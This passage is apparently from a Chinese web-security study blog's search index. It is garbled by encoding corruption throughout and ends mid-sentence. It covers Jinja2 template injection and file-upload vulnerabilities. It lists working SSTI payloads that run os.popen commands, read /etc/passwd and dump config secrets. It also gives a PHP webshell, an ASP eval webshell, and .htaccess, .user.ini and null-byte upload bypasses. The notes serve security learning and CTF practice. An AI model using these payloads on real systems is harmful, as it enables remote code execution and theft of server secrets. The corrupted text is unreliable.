è¿”å›æ‰€æœ‰ä»å¤„äºæ´»åŠ¨çŠ¶æ€çš„å¼•ç”¨çš„åˆ—è¡¨ï¼Œåˆ—è¡¨æŒ‰å®šä¹‰é¡ºåºæ’åˆ—ï¼ˆç”¨äºæ‰¾å­ç±»ï¼‰ globals è·å–å‡½æ•°æ‰€å±ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„æ¨¡å—ï¼ˆ__builtins__ï¼‰ã€æ–¹æ³•åŠå˜é‡ï¼ˆç”¨äºè®¿é—®å…¨å±€å˜é‡ï¼‰ import ç”¨äºå¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å— builtins è¿”å›Pythonä¸­çš„å†…ç½®å‡½æ•°ï¼Œå¦‚eval å¯»æ‰¾å¯åˆ©ç”¨çš„ç±» # è·å–å¯¹è±¡æ‰€å±çš„ç±».__class__class str().__class__class tuple[].__class__class list .__class__class str# è·å–çˆ¶ç±».__class__.__base__class object.__class__.__bases__(class object,).__class__.__mro__(class str, class object)# è·å–å­ç±».__class__.__base__.__subclasses__().__class__.__bases__[0].__subclasses__().__class__.__mro__[-1].__subclasses__() å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ï¼Œçœ‹çœ‹å“ªä¸ªç±»å¯ä»¥ç”¨ import re# å°†æŸ¥æ‰¾åˆ°çš„å­ç±»åˆ—è¡¨æ›¿æ¢åˆ°dataä¸­data = r [class type, class weakref, ......]# åœ¨è¿™é‡Œæ·»åŠ å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œä¸‹é¢ä¼šä»‹ç»è¿™äº›ç±»çš„åˆ©ç”¨æ–¹æ³•userful_class = [linecache, os._wrap_close, subprocess.Popen, warnings.catch_warnings, _frozen_importlib._ModuleLock, _frozen_importlib._DummyModuleLock, _frozen_importlib._ModuleLockManager, _frozen_importlib.ModuleSpec]pattern = re.compile(r(.*?))class_list = re.findall(pattern, data)for c in class_list: for i in userful_class: if i in c: print(str(class_list.index(c)) + : + c) æ„é€ payload æ„é€ payloadï¼Œå¯ä»¥è·å–é…ç½®æ–‡ä»¶ã€XSSã€è¿›è¡ŒRCEï¼ˆåå¼¹shellä¹Ÿè¡Œï¼‰æˆ–è€…æ–‡ä»¶è¯»å†™ï¼š è·å–é…ç½®ä¿¡æ¯ # è·å–é…ç½®ä¿¡æ¯config # èƒ½è·å–åˆ°configï¼Œå®ƒåŒ…å«äº†å¦‚æ•°æ®åº“é“¾æ¥å­—ç¬¦ä¸²ã€è¿æ¥åˆ°ç¬¬ä¸‰æ–¹çš„å‡­è¯ã€SECRET_KEYç­‰æ•æ„Ÿä¿¡æ¯request.environ # æœåŠ¡å™¨ç¯å¢ƒä¿¡æ¯ XSS # XSSname=scriptalert(/YouAreHacked/)/script RCE å¸¸ç”¨ï¼š#åˆ©ç”¨configé…ç½®ä¿¡æ¯ç›´æ¥è°ƒç”¨osæ¨¡å—ï¼ˆå¥½ç”¨ï¼‰config.__class__.__init__.__globals__[os].popen(env).read()#ç”¨osæ¨¡å—ä¸­listdiråˆ—ç›®å½•ï¼ˆå¸¸ç”¨äºpopenè¢«è¿‡æ»¤ï¼‰config.__class__.__init__.__globals__[os].listdir(/)#è¯»å–æ–‡ä»¶ï¼ˆé€šå¸¸è¯»å–æºç æ¥è·å¾—wafï¼‰config.__class__.__init__.__globals__[__builtins__].open(app.py).read()# åˆ©ç”¨warnings.catch_warningsé…åˆ__builtins__å¾—åˆ°evalå‡½æ•°ï¼Œç›´æ¥æ¢­å“ˆï¼ˆå¸¸ç”¨ï¼‰.__class__.__base__.__subclasses__()[166].__init__.__globals__[__builtins__][eval](__import__(os).popen(env).read())# è¯»å–æ–‡ä»¶.__class__.__base__.__subclasses__()[80].__init__.__globals__[__builtins__].open(flag.txt).read()#åªæœ‰æ–‡ä»¶è¯»å–åŠŸèƒ½.__class__.__base__.__subclasses__()[80](/etc/passwd).read()# åˆ©ç”¨os._wrap_closeç±»æ‰€å±ç©ºé—´ä¸‹å¯ç”¨çš„popenå‡½æ•°è¿›è¡ŒRCEçš„payload.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen(whoami).read().__class__.__base__.__subclasses__()[117].__init__.__globals__[popen](whoami).read()#åˆ©ç”¨æ¨¡æ¿è¯­å¥% for c in [].__class__.__base__.__subclasses__() %% if c.__name__ == catch_warnings %% for b in c.__init__.__globals__.values() %% if b.__class__ == .__class__ %% if eval in b.keys() % b[eval](__import__(os).popen(type flag.txt).read()) % endif %% endif %% endfor %% endif %% endfor %ä¸å¸¸ç”¨ï¼š# åˆ©ç”¨subprocess.Popenç±»è¿›è¡ŒRCEçš„payload.__class__.__base__.__subclasses__()[479](whoami,shell=True,stdout=-1).communicate()[0].strip()# åˆ©ç”¨__import__å¯¼å…¥osæ¨¡å—è¿›è¡Œåˆ©ç”¨.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(os).popen(whoami).read()# åˆ©ç”¨linecacheç±»æ‰€å±ç©ºé—´ä¸‹å¯ç”¨çš„osæ¨¡å—è¿›è¡ŒRCEçš„payloadï¼Œå‡è®¾linecacheä¸ºç¬¬250ä¸ªå­ç±».__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[os].popen(whoami).read()[].__class__.__base__.__subclasses__()[250].__init__.func_globals[linecache].__dict__.[os].popen(whoami).read()# åˆ©ç”¨fileç±»ï¼ˆpython3å°†fileç±»åˆ é™¤äº†ï¼Œå› æ­¤åªæœ‰python2å¯ç”¨ï¼‰è¿›è¡Œæ–‡ä»¶è¯»[].__class__.__base__.__subclasses__()[40](etc/passwd).read()[].__class__.__base__.__subclasses__()[40](etc/passwd).readlines()# åˆ©ç”¨fileç±»è¿›è¡Œæ–‡ä»¶å†™ï¼ˆpython2çš„strç±»å‹ä¸ç›´æ¥ä»å±äºå±äºåŸºç±»ï¼Œæ‰€ä»¥è¦ä¸¤æ¬¡ .__bases__ï¼‰.__class__.__bases[0]__.__bases__[0].__subclasses__()[40](/tmp).write(test)# é€šç”¨getshellï¼Œéƒ½æ˜¯é€šè¿‡__builtins__è°ƒç”¨evalè¿›è¡Œä»£ç æ‰§è¡Œ% for c in [].__class__.__base__.__subclasses__() %% if c.__name__==catch_warnings %c.__init__.__globals__[__builtins__].eval(__import__(os).popen(whoami).read()) % endif %% endfor %# è¯»å†™æ–‡ä»¶ï¼Œé€šè¿‡__builtins__è°ƒç”¨openè¿›è¡Œæ–‡ä»¶è¯»å†™% for c in [].__class__.__base__.__subclasses__() %% if c.__name__==catch_warnings % c.__init__.__globals__[__builtins__].open(filename, r).read() % endif %% endfor % å‚è€ƒï¼š Jinjaç”¨æ³•æ€»ç»“ Python SSTIæ¼æ´å­¦ä¹ æ€»ç»“ SSTIæ¨¡æ¿æ³¨å…¥(Python+Jinja2)","tags":["æ¼æ´","SSTI"],"categories":["æ¼æ´"]},{"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","path":"/2025/07/09/æ–‡ä»¶ä¸Šä¼ æ¼æ´/","content":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¦‚è¿° ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”±äºå¯¹ç”¨æˆ·æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„æ§åˆ¶ä¸è¶³æˆ–è€…å¤„ç†ç¼ºé™·ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥å‘æœåŠ¡å™¨ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼ˆæœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ï¼‰å¹¶è¿›è¡Œæ‰§è¡Œï¼Œåè·å¾—æ‰§è¡ŒæœåŠ¡ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚ å¤§ç™½è¯ï¼šåœ¨è¦ä¸Šä¼ çš„æ–‡ä»¶é‡Œæ„é€ è¯­å¥å¹¶æŒ‰ç…§ç‰¹å®šçš„æ–¹å¼è¿›è¡Œä¸Šä¼ ï¼Œä»¥è¾¾åˆ°æ”»å‡»è€…çš„ç›®çš„ æ–‡ä»¶ä¸Šä¼ æ¼æ´äº§ç”ŸåŸå›  æ¼æ´æˆå›  æ”»å‡»æ–¹å¼ ç¤ºä¾‹ æ–‡ä»¶åç¼€åæ ¡éªŒä¸ä¸¥ ä¸Šä¼  shell.php.jpgæˆ–shell.phPï¼ˆå¤§å°å†™ç»•è¿‡ï¼‰ ç»•è¿‡æ‰©å±•åæ£€æŸ¥ MIME ç±»å‹æ ¡éªŒä¸ä¸¥ ä¿®æ”¹ Content-Type: image/png ä¼ªé€  MIME ç±»å‹ è§£ææ¼æ´ shell.php/ shell.asp;.jpg Nginx/IIS è§£ææ¼æ´ ç›®å½•å¯æ‰§è¡Œ ä¸Šä¼  shell.php è®¿é—® uploads/shell.php ç›´æ¥è®¿é—® Webshell è¿‡æ»¤ä¸è¶³ shell.php%00.jpg GIF89a ä¼ªé€ æ–‡ä»¶ æƒé™é…ç½®é—®é¢˜ æœåŠ¡å™¨å…è®¸æ‰§è¡Œä¸Šä¼ æ–‡ä»¶ ææƒæˆ–è¿œç¨‹æ§åˆ¶ é«˜å±è§¦å‘ç‚¹ ç›¸å†Œã€å¤´åƒä¸Šä¼ ï¼Œè§†é¢‘ã€ç…§ç‰‡åˆ†äº«ã€‚è®ºå›å‘å¸–å’Œé‚®ç®±ç­‰å¯ä»¥ä¸Šä¼ é™„ä»¶çš„åœ°æ–¹æˆ–æœ‰æ–‡ä»¶ç®¡ç†åŠŸèƒ½çš„åœ°æ–¹ é™åˆ¶æªæ–½åŠç»•è¿‡ å‰ç«¯æ£€æµ‹ å‰ç«¯æ£€æµ‹ä¸»è¦æ˜¯é€šè¿‡JavaScriptè¯­å¥ åˆ¤æ–­ å‰ç«¯éªŒè¯é€šè¿‡ä»¥åï¼Œè¡¨å•æˆåŠŸæäº¤åä¼šé€šè¿‡æµè§ˆå™¨å‘å‡ºâ”€æ¡ç½‘ç»œè¯·æ±‚ï¼Œä½†æ˜¯å¦‚æœå‰ç«¯éªŒè¯å¤±è´¥ï¼Œåˆ™ä¸ä¼šå‘å‡ºè¿™é¡¹ç½‘ç»œè¯·æ±‚ï¼ˆä¸ä¼šå‘åŒ…ï¼‰;å¯ä»¥åœ¨æµè§ˆå™¨çš„ç½‘ç»œå…ƒç´ ä¸­æŸ¥çœ‹æ˜¯å¦å‘å‡ºäº†ç½‘ç»œè¯·æ±‚ ç»•è¿‡ æ”¹å˜å‰ç«¯ åˆ é™¤JS F12ä¿®æ”¹sourceçš„JavaScriptä»£ç ï¼Œç›´æ¥åˆ é™¤å…³äºæ–‡ä»¶ä¸Šä¼ æ—¶éªŒè¯ä¸Šä¼ æ–‡ä»¶ç›¸å…³ä»£ç  ç¦ç”¨JS ç›´æ¥åœ¨F12çš„è®¾ç½®ä¸­ç¦ç”¨JavaScript éª—è¿‡å‰ç«¯ ä¸Šä¼ ç¬¦åˆè¦æ±‚çš„æ–‡ä»¶ç±»å‹ï¼ŒæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹ å¦‚æ–‡ä»¶åæ˜¯name.pngï¼Œåœ¨bpæŠ“åŒ…åæ”¹æˆname.php æ³¨ï¼šåªæœ‰å‰ç«¯é€šè¿‡åæ‰èƒ½å‘åŒ…ï¼Œbpè¿™æ—¶æ‰èƒ½æŠ“åŒ… è§£ææ¼æ´ .htaccessæ–‡ä»¶è§£ææ¼æ´ åŸºç¡€ åŸç† .htaccessæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé‡Œé¢å­˜æ”¾ç€ApacheæœåŠ¡å™¨é…ç½®ç›¸å…³çš„æŒ‡ä»¤ã€‚é€šè¿‡.htaccesså¯ä»¥åšåˆ°ï¼šé‡å†™è§£æè§„åˆ™(å¦‚ï¼šå°†pngæ–‡ä»¶ä½œä¸ºphpæ¥è¿›è¡Œè§£æç­‰)ã€URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIMEç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ åˆ©ç”¨å‰æ ä½¿ç”¨Apache æœåŠ¡å™¨ï¼ˆ ä¸é€‚ç”¨äºNginx æœåŠ¡å™¨ï¼‰ èƒ½æˆåŠŸä¸Šä¼ .htaccessæ–‡ä»¶çš„ä¸Šä¼ ï¼Œä¸”æ²¡æœ‰è¢«é‡å‘½å åˆ©ç”¨æ–¹å¼ ä¸Šä¼ è¦†ç›–.htaccessæ–‡ä»¶ï¼Œé‡å†™è§£æè§„åˆ™ï¼Œå°†ä¸Šä¼ çš„å¸¦æœ‰è„šæœ¬é©¬çš„å›¾ç‰‡ä»¥è„šæœ¬æ–¹å¼è§£æã€‚ ç»•è¿‡ å…ˆå‘½åæˆa.htaccessï¼ŒbpæŠ“åŒ…æ”¹æˆ.htaccesså³å¯ï¼Œå†…å®¹ä¸ºï¼š AddType application/x-httpd-php .jpg //è®© .jpg æ–‡ä»¶è¢«è§£æä¸º PHP å†å†™ä¸ªæœ¨é©¬ï¼Œæ”¹åä¸ºshell.jpgï¼Œå†…å®¹ä¸ºï¼š ?php system($_GET[cmd]); ? æ­¤æ—¶jpgæ–‡ä»¶ä¼šæŒ‰ç…§phpæ–‡ä»¶è¢«è§£æï¼Œä¹Ÿå°±æ˜¯shell.jpgè¢«å½“æˆphpæ–‡ä»¶æ‰§è¡Œï¼Œç„¶åå¼€èšå‰‘/ç›´æ¥è®¿é—®shell.jpgæ‰§è¡Œå‘½ä»¤ http://example.com/uploads/shell.jpg?cmd=whoami æ¨¡æ¿ #å¯¹äºphpAddType application/x-httpd-php .html #å°†htmlæ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æ#å¯¹äºpythonAddHandler cgi-script .py #å°†htmlæ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æOptions +ExecCGI #å¯¹äºPerlAddHandler cgi-script .cgi .plOptions +ExecCGI Apacheè§£ææ¼æ´ åŸºç¡€ åŸç† Apacheè§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æï¼Œå°±åœ¨å¾€å·¦åˆ¤æ–­ å¦‚test.php.a.bçš„.aå’Œ.bè¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æï¼Œapacheå°±ä¼šæŠŠtest.php.a.bè§£ææˆtest.php å¤§ç™½è¯ï¼šåç¼€å¯ä»¥æ˜¯å…¶ä»–çš„ï¼Œåªè¦æ–‡ä»¶åé‡Œæœ‰.phpï¼Œå°±æŒ‰ç…§PHPæ–‡ä»¶æ‰§è¡Œä¹Ÿå¯ä»¥ä½¿ç”¨.php\\x0aï¼ˆ\\x0a ä¸ºæ¢è¡Œç¬¦ï¼Œapacheè§£ææ—¶ä¼šæŠŠå…¶å½“ä½œåˆ†éš”ç¬¦ï¼‰æ¥è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ IIS6.0/IIS5.xè§£ææ¼æ´ æ–‡ä»¶è§£ææ¼æ´ ä¸Šä¼ æ–‡ä»¶åï¼šxxx.asp;.jpg æœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤xxx.asp;.jpgè¢«å½“åšaspæ–‡ä»¶è§£æ ä¸€èˆ¬æ­¥éª¤ï¼šå†™å¹¶ä¼ é©¬ - æŠ“åŒ… - ä¿®æ”¹ä¸Šä¼ è·¯å¾„ - èšå‰‘ ç›®å½•è§£ææ¼æ´ å‘xxx.aspç›®å½•ä¸‹é¢ä¸Šä¼ xxx.jpg æœåŠ¡å™¨ä¼šå°†xxx.aspå‘½åçš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶éƒ½å½“åšaspæ–‡ä»¶è§£æ æ³¨ï¼šIIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§.asa .cer .cdx ä¸€èˆ¬æ­¥éª¤ï¼šå†™å¹¶ä¼ é©¬ - æŠ“åŒ… - æ”¹æ–‡ä»¶å - èšå‰‘ aspä¸€å¥è¯æœ¨é©¬(æ³¨æ„æ–‡ä»¶åç¼€æ˜¯asp) %eval request(admin)% æ–‡ä»¶ä¸Šä¼ ä¹‹IIS6.0è§£ææ¼æ´_iis6è§£ææ¼æ´åˆ©ç”¨-CSDNåšå®¢ IIS7.0 | IIS7.5 | Nginxçš„è§£ææ¼æ´ åŸç† Nginxæ‹¿åˆ°æ–‡ä»¶è·¯å¾„ï¼ˆURIï¼‰/test.jpg/test.phpåï¼Œä¸€çœ‹åç¼€æ˜¯.phpï¼Œä¾¿è®¤ä¸ºè¯¥æ–‡ä»¶æ˜¯phpæ–‡ä»¶ï¼Œè½¬äº¤ç»™phpå»å¤„ç†ã€‚phpä¸€çœ‹/test.jpg/test.phpä¸å­˜åœ¨ï¼Œä¾¿åˆ å»æœ€åçš„/test.phpï¼Œåˆçœ‹/test.jpgå­˜åœ¨ï¼Œä¾¿æŠŠ/test.jpgå½“æˆè¦æ‰§è¡Œçš„æ–‡ä»¶äº†ï¼Œåˆå› ä¸ºåç¼€ä¸º.jpgï¼Œphpè®¤ä¸ºè¿™ä¸æ˜¯phpæ–‡ä»¶ï¼Œäºæ˜¯è¿”å›Access denied è¿™å…¶ä¸­æ¶‰åŠåˆ°phpçš„ä¸€ä¸ªé€‰é¡¹ï¼šcgi.fix_pathinfoï¼Œè¯¥å€¼é»˜è®¤ä¸º1ï¼Œè¡¨ç¤ºå¼€å¯ã€‚å¼€å¯è¿™ä¸€é€‰é¡¹PHPå¯ä»¥å¯¹æ–‡ä»¶è·¯å¾„è¿›è¡Œä¿®ç† å¦‚å½“phpé‡åˆ°æ–‡ä»¶è·¯å¾„/1.jpg/2.txt/3.phpæ—¶ï¼Œè‹¥/1.jpg/2.txt/3.phpä¸å­˜åœ¨ï¼Œåˆ™ä¼šå»æ‰æœ€åçš„/3.phpï¼Œç„¶ååˆ¤æ–­/1.jpg/2.txtæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™æŠŠ/1.jpg/2.txtå½“åšæ–‡ä»¶/1.jpg/2.txt/3.phpï¼Œè‹¥/1.jpg/2.txtä»ä¸å­˜åœ¨ï¼Œåˆ™ç»§ç»­å»æ‰/2.txtï¼Œä»¥æ­¤ç±»æ¨ ç®€å•æ¥è¯´ï¼Œæ–‡ä»¶æˆ‘ä»¬å¯ä»¥åœ¨å­˜åœ¨çš„æ–‡ä»¶è·¯å¾„åé¢åŠ ä¸€ä¸ªè™šå‡çš„/name.phpï¼Œè¿™ä¸ªå­˜åœ¨çš„æ–‡ä»¶å¦‚æœæ˜¯ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œå°±å¯èƒ½å®ç°getshell æ¼æ´å½¢å¼ www.xxxxx.com/UploadFiles/image/1.jpg/1.php www.xxxxx.com/UploadFiles/image/1.jpg%00.php www.xxxxx.com/UploadFiles/image/1.jpg/%20\\0.php .user.iniæ–‡ä»¶åŒ…å«æ¼æ´ åŸºç¡€ åŸç† .user.iniæ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼ˆphp.iniæ˜¯phpçš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡èµ·ä½œç”¨ï¼Œä½†.user.iniä»…å¯¹å½“å‰ç›®å½•åŠå­ç›®å½•æœ‰æ•ˆï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰é™¤äº†PHP_INI_SYSTEMä»¥å¤–çš„æ¨¡å¼ï¼Œåœ¨æ‰§è¡Œphpä»£ç ä¹‹å‰ï¼Œç³»ç»Ÿä¼šå¯¹.user.iniå…ˆåšä¸€ä¸ªæ‰§è¡Œï¼Œç„¶åæ‰æ‰§è¡Œå…¶ä»–çš„phpæ–‡ä»¶ã€‚ æˆ‘ä»¬è¿™è¾¹åˆ©ç”¨.user,iniå…ˆæ‰§è¡Œauto_prepend_fileå‡½æ•°ï¼Œauto_prepend_fileè¡¨ç¤ºåœ¨phpç¨‹åºåŠ è½½ç¬¬ä¸€ä¸ªphpä»£ç å‰åŠ è½½çš„phpæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å…ˆåŠ è½½äº†a.jpgé‡Œé¢çš„æ–‡ä»¶ï¼Œå³ä¸€å¥è¯æœ¨é©¬ ä½¿ç”¨å‰æ èƒ½æˆåŠŸä¸Šä¼ .user.iniæ–‡ä»¶çš„ä¸Šä¼ ï¼Œä¸”æ²¡æœ‰è¢«é‡å‘½å æ­¤ç›®å½•ä¸‹å·²æœ‰ä¸€ä¸ªä»»æ„çš„.phpæ–‡ä»¶ æ¨¡æ¿ auto_prepend_file = filename //å°†æŒ‡å®šæ–‡ä»¶åŒ…å«åœ¨è¯¥ç›®å½•ä¸­æ‰€æœ‰phpè„šæœ¬çš„æ–‡ä»¶å¤´éƒ¨auto_append_file = filename //å°†æŒ‡å®šæ–‡ä»¶åŒ…å«åœ¨è¯¥ç›®å½•ä¸­æ‰€æœ‰phpè„šæœ¬çš„æ–‡ä»¶å°¾éƒ¨ åˆ©ç”¨ å…ˆä¸Šä¼ a.user.ini.jpgæ–‡ä»¶ï¼Œå†…å®¹ï¼š GIF89a //ç»•è¿‡exif_imagetype()auto_prepend_file=test1.png //æŒ‡å®šåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æçš„æ–‡ä»¶çš„åç§°ï¼Œå¹¶åŒ…å«è¯¥æ–‡ä»¶ï¼Œå°±åƒä½¿ç”¨requireå‡½æ•°è°ƒç”¨å®ƒä¸€æ ·ã€‚å®ƒåŒ…å«åœ¨æ‰€æœ‰phpæ–‡ä»¶å‰å…ˆæ‰§è¡Œauto_append_file=test1.png //è§£æåè¿›è¡ŒåŒ…å«ï¼Œå®ƒåŒ…å«åœ¨æ‰€æœ‰phpæ–‡ä»¶æ‰§è¡Œåæ‰§è¡Œ bpæŠ“åŒ…æ”¹åä¸º.user.ini å†ä¸Šä¼ test1.pngï¼Œæ²¡å¿…è¦æ”¹åï¼Œå…¶å†…å®¹ä¼šè¢«å½“åšPHPæ–‡ä»¶å†…å®¹æ‰§è¡Œã€‚ è¿™å¥è¯ï¼šauto_prepend_fileè¡¨ç¤ºåœ¨phpç¨‹åºåŠ è½½ç¬¬ä¸€ä¸ªphpä»£ç å‰åŠ è½½çš„phpæ–‡ä»¶ æˆ‘ä»¬è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè‡ªå·±ä¼ ä¼šè¢«UnicodeåŒ–ï¼Œé‚£çœ‹çœ‹æ˜¯å¦æœ‰åŸæœ‰çš„ï¼š url/upload/index.php èšå‰‘è¿ [SUCTF 2019]CheckIn æ•°å­—åç¼€ç»•è¿‡ PHP æ–‡ä»¶çš„æ ‡å‡†åç¼€å§‹ç»ˆæ˜¯ .phpï¼Œé€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬çš„ PHPã€‚ç„¶è€Œï¼Œåœ¨æŸäº›ç‰¹å®šåœºæ™¯æˆ–ç”±æŸäº›å¼€å‘è€…/ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨.php3 ã€.php5 ã€.php7 ç­‰ä¸æ˜¯ PHP è¯­è¨€çš„æ ‡å‡†æ–‡ä»¶åç¼€,ç”±äºä¸€äº›ç‰¹æ®Šçš„è®¾ç½®.php7 ç­‰åç¼€å¯è¢«PHPè§£é‡Šå™¨è§£æ åˆ©ç”¨ Apache çš„é…ç½®æ–‡ä»¶æˆ–ç›®å½•ä¸‹çš„.htaccess æ–‡ä»¶æœ‰æ·»åŠ è®¾ç½®ï¼Œå¦‚.php7å¯è¢«è§£æçš„é…ç½®ä¸ºï¼š AddHandler application/x-httpd-php .php7 åç«¯æ£€æµ‹_æ–‡ä»¶å¤´æ£€æµ‹æ¼æ´ åŸºç¡€ åŸç† åœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ï¼ˆåŒ…æ‹¬å›¾ç‰‡ï¼Œè§†é¢‘æˆ–å…¶ä»–çš„éASCIIæ–‡ä»¶ï¼‰çš„å¼€å¤´ï¼ˆåå…­è¿›åˆ¶è¡¨ç¤ºï¼‰å®é™…ä¸Šéƒ½æœ‰ä¸€ç‰‡åŒºåŸŸæ¥æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶çš„å®é™…ç”¨æ³•ï¼Œè¿™å°±æ˜¯æ–‡ä»¶å¤´æ ‡å¿—ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶ï¼Œæ·»åŠ æœåŠ¡å™¨å…è®¸çš„æ–‡ä»¶å¤´ä»¥ç»•è¿‡æ£€æµ‹ å¸¸è§æ–‡ä»¶å¤´ GIFï¼š 16è¿›åˆ¶æ¨¡å¼ï¼š47 49 46 38 39 61 å¯¹åº”æ–‡æœ¬ï¼š GIF89a pngï¼š 16è¿›åˆ¶æ¨¡å¼ï¼š89 50 4E 47 0D 0A 1A 0A å¯¹åº”æ–‡æœ¬ï¼š â€°PNG JPGï¼š 16è¿›åˆ¶æ¨¡å¼ï¼šFF D8 FF E0 00 10 4A 46 49 46 å¯¹åº”æ–‡æœ¬ï¼š Ã¿Ã˜Ã¿Ã  åœ¨è¿›è¡Œæ–‡ä»¶å¤´ç»•è¿‡æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸Šé¢çš„æ–‡ä»¶å¤´æ·»åŠ åˆ°æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å†…å®¹æœ€å‰é¢ï¼Œè¾¾åˆ°ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹çš„ç›®çš„ æ³¨ï¼šæœ€å¥½æ–‡ä»¶å¤´å’Œä»£ç ï¼ˆæœ¨é©¬ï¼‰ä¹‹é—´æœ‰ä¸ªç©ºæ ¼ æŸäº›æƒ…å†µä¸‹ï¼Œåç«¯å¯èƒ½è¿˜ä¼šæ£€æµ‹æ–‡ä»¶æ‹“å±•åï¼Œæ­¤æ—¶éœ€è¦ç»“åˆè§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«æ‰èƒ½å®ç°æ‰§è¡Œæœ¨é©¬ åç«¯æ£€æµ‹_00æˆªæ–­ åŸºç¡€ è™½ç„¶webåº”ç”¨åšäº†æ ¡éªŒï¼Œä½†æ˜¯ç”±äºæ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„ç”¨æˆ·å¯ä»¥æ§åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰‹åŠ¨æ·»åŠ å­—ç¬¦ä¸²æ ‡è¯†ç¬¦0X00çš„æ–¹å¼æ¥å°†åé¢çš„æ‹¼æ¥çš„å†…å®¹è¿›è¡Œæˆªæ–­ï¼Œå¯¼è‡´åé¢çš„å†…å®¹æ— æ•ˆï¼Œè€Œä¸”åé¢çš„å†…å®¹åˆå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡é»‘ç™½åå•çš„æ£€æµ‹ åˆ©ç”¨æ¡ä»¶ phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œ5.3.4åŠä»¥ä¸Šå·²ç»ä¿®å¤è¯¥é—®é¢˜ PHPçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ ç”¨æˆ·å¯æŒ‡å®šä¸Šä¼ è·¯å¾„ ç»•è¿‡ %00ç»è¿‡URLè§£ç åå°±æ˜¯0x00ï¼ŒäºŒè€…çš„æ„æ€éƒ½æ˜¯ç©ºå­—ç¬¦ï¼Œè¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²çš„ç»“æŸã€‚æ— è®º00åå­˜åœ¨ä»»ä½•å†…å®¹æ–‡æœ¬(æˆ–åç«¯ç›´æ¥å¯¹00å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥å…¶ä»–å­—ç¬¦ä¸²)ï¼Œ00åçš„å†…å®¹éƒ½ä¼šè¢«æˆªæ–­ï¼Œæœ€åå­—ç¬¦ä¸²ç•™ä¸‹00å‰çš„å†…å®¹ä¸”ä¸åŒ…æ‹¬00 æˆ‘ä»¬å°±å¯ä»¥æ ¹æ®æºç åˆ©ç”¨%00å®ç°.phpåç¼€ GETä¼ å‚ä¿å­˜è·¯å¾„ åç«¯å¯¹æ–‡ä»¶è·¯å¾„çš„å¤„ç†ç±»ä¼¼ä¸º $des = $_GET[road] . /å¯¹æ–‡ä»¶åçš„å¤„ç†æ“ä½œ...... . $ext; æ­¤æ—¶roadä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œå¯ç›´æ¥è¿›è¡Œä½¿ç”¨%00æˆªæ–­ ç”±äºä½¿ç”¨00æˆªæ–­ï¼Œæ‰€ä»¥æœ€åæ–‡ä»¶ä¿å­˜åœ¨/var/www/html/upload,åä¸ºshell.php,æ 